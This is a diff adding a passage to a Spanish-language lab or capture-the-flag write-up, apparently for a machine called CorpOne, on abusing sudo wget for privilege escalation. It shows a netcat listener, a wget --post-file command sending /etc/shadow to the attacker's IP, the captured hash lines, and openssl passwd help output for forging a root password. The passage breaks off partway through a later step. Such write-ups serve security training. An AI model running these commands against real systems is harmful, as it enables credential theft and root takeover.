@@ -189,6 +189,93 @@ Listamos los comandos que nos estan permitidos ejecutar como root en la maquina 
 
 Encontramos un articulo donde podemos abusar del comando wget para escalar privilegios ---> https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-wget-privilege-escalation/
 
+1) Exfiltramos el fichero /etc/shadow (El fichero /etc/shadow almacena las contraseñas de las cuentas de usuario) , para ello utilizaremos --post-file
+
+    Nos ponemos en escucha con netcat en nuestra maquina
+   
+        ┌──(root㉿kali)-[/home/kali]
+        └─# nc -lnvp 1988
+        listening on [any] 1988 ...
+
+   Exfiltramos los datos con wget
+
+        jessie@CorpOne:~$ sudo /usr/bin/wget --post-file=/etc/shadow 10.9.92.151:1988
+        --2023-08-02 12:17:40--  http://10.9.92.151:1988/
+        Connecting to 10.9.92.151:1988... connected.
+        HTTP request sent, awaiting response... 
+
+    
+    Obtenemos el contenido del fichero /etc/shadow (Info sobre /etc/shadow --> https://blog.elhacker.net/2022/02/icheros-etc-passwd-shadow-y-group.html)
+
+        ┌──(root㉿kali)-[/home/kali]
+        └─# nc -lnvp 1988
+        listening on [any] 1988 ...
+        connect to [10.9.92.151] from (UNKNOWN) [10.10.111.201] 49820
+        POST / HTTP/1.1
+        User-Agent: Wget/1.17.1 (linux-gnu)
+        Accept: */*
+        Accept-Encoding: identity
+        Host: 10.9.92.151:1988
+        Connection: Keep-Alive
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 1273
+        
+        root:!:18195:0:99999:7:::
+        daemon:*:17953:0:99999:7:::
+        bin:*:17953:0:99999:7:::
+        sys:*:17953:0:99999:7:::
+        sync:*:17953:0:99999:7:::
+        games:*:17953:0:99999:7:::
+        man:*:17953:0:99999:7:::
+       [...]
+
+
+3) Creamos una nueva clave para el usuario root, mediante openssl(con esta ayuda tenemos todo lo necesario para crear la clave)
+   Segun la info obtenida del enlace anterior sobre el fichero shadow la clave esta formada de la siguiente manera( $id$salt$hashed )
+
+       ┌──(root㉿kali)-[/home/kali]
+        └─# openssl passwd --help              
+        Usage: passwd [options] [password]
+        
+        General options:
+         -help               Display this summary
+        
+        Input options:
+         -in infile          Read passwords from file
+         -noverify           Never verify when reading password from terminal
+         -stdin              Read passwords from stdin
+        
+        Output options:
+         -quiet              No warnings
+         -table              Format output as table
+         -reverse            Switch table columns
+        
+        Cryptographic options:
+         -salt val           Use provided salt
+         -6                  SHA512-based password algorithm
+         -5                  SHA256-based password algorithm
+         -apr1               MD5-based password algorithm, Apache variant
+         -1                  MD5-based password algorithm
+         -aixmd5             AIX MD5-based password algorithm
+        
+        Random state options:
+         -rand val           Load the given file(s) into the random number generator
+         -writerand outfile  Write random data to the specified file
+        
+        Provider options:
+         -provider-path val  Provider load path (must be before 'provider' argument if required)
+         -provider val       Provider to load (can be specified multiple times)
+         -propquery val      Property query used when fetching algorithms
+        
+        Parameters:
+         password            Password text to digest (optional)
+
+
+   
+       
+
+   
+
 
 
 
